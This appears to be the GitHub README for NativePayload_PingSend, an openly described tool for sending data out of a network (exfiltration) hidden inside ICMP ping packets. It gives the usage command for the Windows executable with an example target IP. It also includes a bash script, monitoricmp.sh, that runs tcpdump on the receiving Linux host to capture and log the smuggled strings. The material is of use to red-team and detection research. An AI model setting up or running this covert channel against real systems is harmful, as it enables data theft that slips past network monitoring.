# NativePayload_PingSend
## NativePayload_PingSend send data/string (exfiltration) to destination ip via icmp ping packets

## as you can see with this code you can send data/string via ping request to linux side via ping linux ipaddress, and in linux side with tcpdump you can dump those string/data in ping packets

you can use "monitoricmp.sh" in linux side to dump and log those strings too

```
#!/bin/bash

# Define the log file
LOGFILE="icmp_packets.log"

# Function to process each packet
process_packet() {
    while IFS= read -r line; do
        # Extract date and time
        datetime=$(date "+%Y-%m-%d %H:%M:%S")
        
        # Extract packet header and payload
        header=$(echo "$line" | grep -oP '^.*? IP .*? > .*?: ICMP echo request')
        payload=$(echo "$line" | grep -oP '0x[0-9a-f]+:.*')

        # Display the packet details
        #echo "[$datetime] Header: $header"
        echo "Payload: $payload"
        echo "[$datetime] Header: $header" >> "$LOGFILE"
        echo "Payload: $payload" >> "$LOGFILE"
    done
}

# Run tcpdump and process packets
tcpdump -i any -nn -XX icmp | process_packet
```
_____________________________________________

           md5 info 74718db7bc753bd2161bf46b0d06a31e => NativePayload_PingSend.exe


### Source code tested by .Netframework 4.7.2 

### Target Platform x64 is ok.

    usage: NativePayload_PingSend.exe ipaddress "string"    
      example NativePayload_PingSend.exe 192.168.56.101 "your string which want to send to target ipaddress via icmp ping packets"


###  NativePayload_PingSend  
   ![](https://github.com/DamonMohammadbagher/NativePayload_PingSend/blob/main/icmp.png)

###  NativePayload_PingSend  
   ![](https://github.com/DamonMohammadbagher/NativePayload_PingSend/blob/main/icmp2.png)

###  NativePayload_PingSend  
   ![](https://github.com/DamonMohammadbagher/NativePayload_PingSend/blob/main/netmon3.png)

###  NativePayload_PingSend and monitoricmp.sh
   ![](https://github.com/DamonMohammadbagher/NativePayload_PingSend/blob/main/bashicmp.png)   


<p><a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https://github.com/DamonMohammadbagher/NativePayload_PingSend"/></a></p>
